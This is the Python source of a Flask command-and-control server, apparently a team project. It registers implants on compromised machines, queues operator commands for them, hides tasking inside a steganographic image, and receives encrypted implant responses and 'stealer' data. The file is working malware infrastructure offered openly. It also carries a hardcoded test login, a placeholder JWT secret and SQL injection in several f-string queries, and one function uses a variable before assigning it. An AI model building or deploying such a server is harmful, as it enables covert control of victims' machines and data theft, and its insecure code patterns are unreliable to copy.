# The C2 Server
import json
import os
from datetime import datetime

import config
import SteganographyFixed
import tools
from decouple import config
from flask import (Flask, jsonify, make_response, redirect, render_template,
                   request, url_for, send_file, send_from_directory)
from flask_cors import CORS, cross_origin
from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                get_jwt_identity, jwt_required,
                                unset_jwt_cookies)
from psycopg2 import connect, sql
import WyattWonderland
import RsaDecryption

app = Flask(__name__)
CORS(app)

# Environment variables
config.host = config('host')
config.password = config('password')
config.username = config('username')
config.port = config('thePort')
config.database = config('database')
config.clientURL = config('client')

# Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
app.config["JWT_SECRET_KEY"] = "change-me"
app.config['CORS_HEADERS'] = 'Content-Type'
jwt = JWTManager(app)

# Logs user out of system


@app.route('/logout', methods=["POST"])
def logout():
    try:
        response = jsonify({"msg": "logout success"})
        unset_jwt_cookies(response)
        return response
    except:
        return "couldn't logout...", 500, {'Access-Control-Allow-Origin': config.clientURL}

# Logs user into system


@app.route('/login', methods=["POST"])
def create_token():
    access_token = ""
    try:
        data = request.form
        username = data["username"]
        password = data["password"]
        print(username)
        print(password)
        if username != "test" or password != "test":  # hardcoded login, TODO compare to database
            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': config.clientURL}

        access_token = create_access_token(identity=username)
        print(f"success logging in: {access_token}")
        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': config.clientURL})
    except Exception as error:
        print(f"error logging in: {error}")
        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/test", methods=["GET"])
def handle_test():
    stuff = tools.executeInsertQuery("SELECT * from command_queue")
    return jsonify(stuff)


@app.route("/")
def home():
    return "<div>Hi</div>", 200

# api endpoint to queue a command


@app.route("/queueCommand", methods=["POST"])
@jwt_required()
def handle_execute():
    try:
        print("Enterring execute")
        target_implant_id = int(request.form.get('target_implant_id'))
        command = request.form.get('command')
        created_on = datetime.now(tz=None).isoformat()
        status = "untouched"
        current_user = get_jwt_identity()

        columns = ['target_implant_id', 'command',
                   'created_on', 'status', 'creator']

        data = target_implant_id, command, created_on, status, current_user
        print("About to send query")
        print(data)
        print(current_user)
        query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
        print(f"data: {data}")
        db_resp = tools.executeInsertQuery(query, data)
        print(db_resp)
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print(f"Failure sending commands: {error}")
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List all commands for a particular implant


@app.route("/get_qcommands", methods=["POST"])
def get_qcommands():
    data = request.json
    id = data['id']
    # if [";", "\'", "\""] in id:
    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
    try:
        query = sql.SQL("select task_id, target_implant_id, command from {table} where {column} = %s").format(
            table=sql.Identifier('task_queue'),
            column=sql.Identifier('target_implant_id'))
        db_resp = tools.executeSelectQueryVars(query, [id])
        print(f"this is the db response: {db_resp}")

        if db_resp == None:
            db_resp = {"commands": "No commands found"}
        data = json.dumps(db_resp)
        query = "UPDATE task_queue SET status=%s WHERE task_id=%s"
        tools.executeGenericVar(query, ['executing', id])

        didNotWork = SteganographyFixed.createEncodedImage(
            "doge.png", data, "doge_encoded.png")

        if (didNotWork != None):
            print()
            print()
            print(didNotWork)
            print()
            print()
            return didNotWork

        return send_file('doge_encoded.png', as_attachment=True), {'Access-Control-Allow-Origin': config.clientURL}

    except Exception as error:
        print("failed to retrieve data on get_qcommands")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List all commands for a particular implant, in json


@app.route("/get_commands", methods=["POST"])
def get_commands():
    data = request.json
    id = data['id']
    try:
        query = sql.SQL("UPDATE {table} SET status = 'executing' WHERE status = 'untouched' AND {column} = %s RETURNING *").format(
            table=sql.Identifier('task_queue'),
            column=sql.Identifier('target_implant_id'))

        db_resp = tools.executeSelectQueryVars(query, [id])

        if db_resp == None:
            db_resp = {"commands": "No commands found"}

        response = db_resp
        return response, {'Access-Control-Allow-Origin': config.clientURL}

    except Exception as error:
        print("failed to retrieve data on get_commands")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}


# Client endpoint for listing commands
@app.route("/client_get_commands", methods=["POST"])
def client_get_commands():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE target_implant_id={id}")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on get_commands")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client


@app.route("/get_untouched", methods=["POST"])
def get_untouched():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"untouched\")")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on untouched")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client


@app.route("/get_executing", methods=["POST"])
def get_executing():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executing\")")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on get_executing")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client


@app.route("/get_executed", methods=["POST"])
def get_executed():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executed\")")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on get_executed")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# Register an implant, on the implant side TODO


@app.route("/register_implant", methods=["POST"])
def register_implant():
    try:
        print("Registering Implant")
        data = request.json
        print(f"Recieved: {data}")
        print(data['sleep'])
        jitter = 10
        sleep = 1
        first_connection = last_seen = datetime.now()
        active = True
        columns = ["first_connection", "active",
                   "jitter", "sleep", "last_seen"]
        values = [first_connection, active, jitter, sleep, last_seen]
        print("Executing Query")
        query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
        response = tools.executeInsertQuery(query, values)
        print(f"Response: {response}")
        return response, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"ERROR: {e}")
        return e, {'Access-Control-Allow-Origin': config.clientURL}

# Display implants


@app.route("/display_implants", methods=["GET"])
def display_implants():
    try:
        dbResp = tools.executeSelectQuery("SELECT * FROM IMPLANTS")
        print(dbResp)
        return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"Error displaying implants: {e}")
        return e, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/response_stealer", methods=["POST"])
@cross_origin()
def handle_response_stealer():
    print("Recieved stealer")
    try:
        request.get_data()
        data = request.data
        dict = json.loads(data)
        print(dict.keys())
        #  if "stealer" in command:
        #     # TODO call Wyatt's function
        #     response_data = WyattWonderland.parsejson(response_data)
        return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print(error)
        return error, 402, {'Access-Control-Allow-Origin': config.clientURL}

# Implant response endpoint, in json

# Addisons Worktime -
# Attempting to add encryption


@app.route("/response_data", methods=["POST"])
@cross_origin()
def handle_response_data():
    print("Received response")
    if (request.content_length < 5000000):
        try:
            data = request.get_data()
            data = RsaDecryption.rsadecrypt(data)
            print("response:")
            print(data)
            print(str(data))
            print(jsonify(data))
            target_implant_id = data['target_implant_id']
            task_id = data['task_id']
            response_data = data['response_data']
            success = data['success']
            command = data['command']
            print("checking command: " + command)
            print("Querying now")
            # DUMP BACK INTO TASK_QUEUE

            if success in ["success", "Success"]:
                success = True
            else:
                success = False

            query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
            if query == []:
                print("\n\nupdate task queue worked\n\n")
            time = datetime.now()
            print(response_data, success, time, task_id)
            response = tools.executeGenericVar(
                query, [response_data, success, time, task_id])
            print(response)
            return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}

        except Exception as error:
            print(error)
            return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
    else:
        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}


# Implant response endpoint, in json
@app.route("/response_json", methods=["POST"])
@cross_origin()
def handle_response_json():
    print("Recieved response")
    try:
        data = request.get_json(force=True)
        print()
        print("response:")
        target_implant_id = data['target_implant_id']
        task_id = data['task_id']
        response_data = data['response_data']
        success = data['success']
        command = data['command']
        print("checking command: " + command)
        print("Querying now")
        # DUMP BACK INTO TASK_QUEUE

        if success in ["success", "Success"]:
            success = True
        else:
            success = False

        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
        time = datetime.now()
        print(response_data, success, time, task_id)
        response = tools.executeGenericVar(
            query, [response_data, success, time, task_id])
        print(response)
        if response == []:
            print("\n\nupdate task queue worked\n\n")
        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}

    except Exception as error:
        print()
        print()
        print(error)
        print()
        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/response", methods=["POST"])
@cross_origin()
def handle_response():
    print("Recieved response")
    try:
        request.get_data()
        print(request.data)
        # file = request.files['file']
        # data = request.json(force=True)
        print()
        print("response:")
        # print(file.name)
        # string_rep = Steganography.decode(Steganography.iio.imread(file))
        # print(string_rep)
        # data = json.loads(string_rep)
        # target_implant_id = data['target_implant_id']
        # task_id = data['task_id']
        # response_data = data['response_data']
        # success = data['success']
        # command = data['command']

        # print("checking command: " + command)
        # if "stealer" in command:
        #     # TODO call Wyatt's function
        #     response_data = WyattWonderland.parsejson(response_data)

        # print("Querying now")
        # # DUMP BACK INTO TASK_QUEUE
        # query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"

        print("succesful")
        time = datetime.now()
        # tools.executeGenericVar(query, [response_data, success, time, task_id])

        # img = iio.imread("doge.png")
        # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
        # print(decode(iio.imread("doge_encoded.png")))

    except Exception as error:
        return error, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/response_test", methods=["POST"])
def testThis():
    try:
        file = "file not accesed"
        file = request.files['file']
        message = SteganographyFixed.decode(
            SteganographyFixed.iio.imread(file))
        print(message)
        return 'yer', 200, {'Access-Control-Allow-Origin': '*'}
    except Exception as error:
        print(error)
        return error, 401, {'Access-Control-Allow-Origin': '*'}

# Gets log history of a particular implant, for console
@app.route("/get_history", methods=["POST"])
def get_history():
    try:
        data = request.json
        id = data['id']

        pending = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'untouched\')")
        executed = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
        executing = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")

        combined = [{"sender": "user", "creator": x[-1],
                     "time":x[3], "command":x[2]} for x in executing]
        combined += [{"sender": "implant", "time": x[-2],
                      "command":x[2], "response":x[-4]} for x in executing]
        combined += [{"sender": "user", "creator": x[-1],
                     "time":x[3], "command":x[2]} for x in executed]
        combined += [{"sender": "implant", "time": x[-2],
                      "command":x[2], "response":x[-4]} for x in executed]
        combined += [{"sender": "user", "creator": x[-1],
                      "time":x[3], "command":x[2]} for x in pending]
        print("This is list that is sorted" + sortedList)
        sortedList = sorted(combined, key=lambda x: x['time'])

        return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
    except Exception as e:
        print(e)
        return e, {'Access-Control-Allow-Origin': '*'}

    # Construct a linear history of commands -> responses
